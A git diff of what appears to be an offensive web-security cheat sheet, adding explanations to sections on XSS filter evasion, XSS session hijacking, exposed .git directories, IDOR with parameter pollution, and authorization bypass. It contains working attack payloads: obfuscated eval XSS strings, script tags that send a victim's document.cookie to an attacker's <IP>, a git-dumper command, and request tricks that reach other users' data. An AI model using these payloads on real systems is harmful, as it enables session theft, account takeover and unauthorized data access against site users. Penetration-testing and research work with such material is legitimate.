@@ -436,6 +436,7 @@ Sometimes you can find a filter being applied as sanitization to mitigate Cross-
 ```js
 eval(String.fromCharCode(97,108,101,114,116,40,34,88,83,83,34,41))
 ```
+
 -> unescape  
 ```js
 eval(unescape("%61%6c%65%72%74%28%27%58%53%53%27%29"))
@@ -498,7 +499,7 @@ https://malwaredecoder.com/
 ```
 
 ### XSS - Session Hijacking
--> Examples
+-> An XSS (Cross-Site Scripting) attack can be used for session hijacking by allowing an attacker to inject malicious code into a web page, which is executed in the victim's browser. This code can access and steal session cookies, such as document.cookie, and send them to the server controlled by the attacker, allowing unauthorized access to the victim's account.
 ```js
 <script>new Image().src="http://<IP>/ok.jpg?output="+document.cookie;</script>
 <script type="text/javascript">document.location="http://<IP>/?cookie="+document.cookie;</script>  
@@ -524,8 +525,9 @@ https://github.com/KathanP19/Gxss
 https://raw.githubusercontent.com/esetal/nuclei-bb-templates/master/xss-fuzz.yaml
 
 ## Git Exposed
+The vulnerability known as Git Exposed occurs when the .git directory of a Git repository is left publicly accessible on web servers, allowing an attacker to download the entire project history, including sensitive files, credentials, source code and information that should be restricted, which can lead to the exposure of critical data and facilitate more advanced attacks.
 ### git-dumper
-```
+```bash
 git-dumper http://site.com/.git .
 ```
 https://github.com/arthaud/git-dumper
@@ -543,45 +545,45 @@ https://github.com/internetwache/GitTools
 	
 #### IDOR + Parameter Pollution
 ##### HTTP Parameter Pollution
-```
+```HTTP
 GET /api/v1/messages?id=<Another_User_ID> #unauthourized
 GET /api/v1/messages?id=<You_User_ID>&id=<Another_User_ID> #authorized
 GET /api/v1/messages?id[]=<Your_User_ID>&id[]=<Another_User_ID>
 ```
 	
 ##### Json Parameter Pollution
-```
+```HTTP
 POST /api/v1/messages
 {"user_id":<You_user_id>,"user_id":<Anoher_User_id>} 
 ```
 
 -> with a JSON Object
-```
+```HTTP
 POST /api/v1/messages
 {"user_id":{"user_id":<Anoher_User_id>}} 
 ```
 
 #### Authorization Bypass
 -> with array  
-```
+```HTTP
 {"user_id":001} #Unauthorized
 {"user_id":[001]} #Authorized
 ```
 
 -> add .json if in ruby
-```
+```HTTP
 GET /user/1029 #Unauthorized
 GET /user/1029.json #Authorized
 ```
 
 -> Random Case
-```
+```HTTP
 GET /admin/profile #Unauthorized
 GET /ADMIN/profile #Authorized
 ```
 
 -> 403 Bypass 
-```
+```HTTP
 ./dontgo403 -u http://site.com/admin
 ```
 https://github.com/devploit/dontgo403
